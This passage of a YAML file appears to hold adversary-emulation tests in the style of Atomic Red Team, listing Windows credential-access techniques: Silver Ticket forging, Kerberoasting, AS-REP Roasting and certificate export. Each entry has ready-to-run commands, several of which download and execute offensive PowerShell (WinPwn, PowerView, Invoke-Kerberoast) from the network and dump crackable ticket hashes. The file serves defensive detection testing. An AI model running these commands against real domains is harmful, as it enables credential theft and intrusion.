/sid:DOMAIN_SID /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /user:silverticketfakeuser /service:HOST /target:%logonserver:\\\\=%.%userdnsdomain% /ptt\" \"exit\"\n\n  echo.\n  echo executing:schtasks /query /S %logonserver:\\\\=%.%userdnsdomain%\n  schtasks /query /S %logonserver:\\\\=%.%userdnsdomain%\n  \n  echo.\n  echo Tickets after requesting schtasks:\n  klist\n\n  echo.\n  echo End of Silver Ticket attack\n)\n\"@ -Replace \"DOMAIN_SID\", $domain_sid | Out-File -Encoding OEM $env:TEMP\\silver.bat\n\n# run batch file in a new empty session (password and username do not matter)\necho \"foo\" | runas /netonly /user:fake \"$env:TEMP\\silver.bat\" | Out-Null\n\n# wait until the output file has logged the entire attack\ndo {\n  Start-Sleep 1 # wait a bit so the output file has time to be created\n  Get-Content -Path \"$env:TEMP\\silver.txt\" -Wait | ForEach-Object {\n    if ($_ -match 'End of Silver Ticket attack') { break } \n  }\n} while ($false) # dummy loop so that 'break' can be used\n\n# show output from new empty session\nGet-Content $env:TEMP\\silver.txt\n\n# cleanup temp files\nRemove-Item $env:TEMP\\silver.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\silver.txt -ErrorAction Ignore"
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1558/002
  is_safe: false
- id: T1558.003
  name: Kerberoasting
  description: "Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to [Brute Force](https://attack.mitre.org/techniques/T1110).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) \n\nService principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least ..."
  tactic: credential-access
  platforms:
    - windows
  executors:
    - name: Request for service tickets
      type: powershell
      platform: windows
      command: |-
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        iex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/08cbd274bef78243d7a8ed6443b8364acd1fc48b/data/module_source/credentials/Invoke-Kerberoast.ps1 -UseBasicParsing)
        Invoke-Kerberoast | fl
      timeout: 120
    - name: Rubeus kerberoast
      type: powershell
      platform: windows
      command: |-
        klist purge
        cmd.exe /c "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe" kerberoast  /outfile:"PathToAtomicsFolder\..\ExternalPayloads\rubeus_output.txt"
      cleanup: Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\rubeus_output.txt" -ErrorAction Ignore
      timeout: 120
    - name: Extract all accounts in use as SPN using setspn
      type: cmd
      platform: windows
      command: setspn -T %USERDNSDOMAIN% -Q */*
      timeout: 120
    - name: Request A Single Ticket via PowerShell
      type: powershell
      platform: windows
      command: |-
        Add-Type -AssemblyName System.IdentityModel
        $ComputerFQDN=$env:LogonServer.trimStart('\') + "." + $env:UserDnsDomain
        New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/$ComputerFQDN"
      timeout: 120
    - name: Request All Tickets via PowerShell
      type: powershell
      platform: windows
      command: "Add-Type -AssemblyName System.IdentityModel  \nsetspn.exe -T %USERDNSDOMAIN% -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }"
      timeout: 120
    - name: WinPwn - Kerberoasting
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        Kerberoasting -consoleoutput -noninteractive
      timeout: 120
    - name: WinPwn - PowerSharpPack - Kerberoasting Using Rubeus
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')
        Invoke-Rubeus -Command "kerberoast /format:hashcat /nowrap"
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1558/003
  is_safe: false
- id: T1558.004
  name: AS-REP Roasting
  description: "Adversaries may reveal credentials of accounts that have disabled Kerberos preauthentication by [Password Cracking](https://attack.mitre.org/techniques/T1110/002) Kerberos messages.(Citation: Harmj0y Roasting AS-REPs Jan 2017) \n\nPreauthentication offers protection against offline [Password Cracking](https://attack.mitre.org/techniques/T1110/002). When enabled, a user requesting access to a resource initiates communication with the Domain Controller (DC) by sending an Authentication Server Reques..."
  tactic: credential-access
  platforms:
    - windows
  executors:
    - name: Rubeus asreproast
      type: powershell
      platform: windows
      command: cmd.exe /c "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe" asreproast /outfile:"PathToAtomicsFolder\..\ExternalPayloads\rubeus_output.txt"
      cleanup: Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\rubeus_output.txt" -ErrorAction Ignore
      timeout: 120
    - name: Get-DomainUser with PowerView
      type: powershell
      platform: windows
      command: |-
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose
      timeout: 120
    - name: WinPwn - PowerSharpPack - Kerberoasting Using Rubeus
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')
        Invoke-Rubeus -Command "asreproast /format:hashcat /nowrap"
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1558/004
  is_safe: false
- id: T1649
  name: Steal or Forge Authentication Certificates
  description: |-
    Adversaries may steal or forge certificates used for authentication to access remote systems or resources. Digital certificates are often used to sign and encrypt messages and/or files. Certificates are also used as authentication material. For example, Entra ID device certificates and Active Directory Certificate Services (AD CS) certificates bind to an identity and can be used as credentials for domain accounts.(Citation: O365 Blog Azure AD Device IDs)(Citation: Microsoft AD CS Overview)

    Auth...
  tactic: credential-access
  platforms:
    - windows
    - linux
    - macos
  executors:
    - name: Staging Local Certificates via Export-Certificate
      type: powershell
      platform: windows
      command: |-
        $archive="$env:PUBLIC\T1649\atomic_certs.zip"
        $exfilpath="$env:PUBLIC\T1649\certs"
        Add-Type -assembly "system.io.compression.filesystem"
        Remove-Item $(split-path $exfilpath) -Recurse -Force -ErrorAction Ignore
        mkdir $exfilpath | Out-Null
        foreach ($cert in (gci Cert:\CurrentUser\My)) { Export-Certificate -Cert $cert -FilePath $exfilpath\$($cert.FriendlyName).cer}
        [io.compression.zipfile]::CreateFromDirectory($exfilpath, $archive)
      cleanup: |-
        $exfilpath="$env:PUBLIC\T1649\certs"
        Remove-Item $(split-path $exfilpath) -Recurse -Force -ErrorAction Ignore
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1649
  is_safe: false
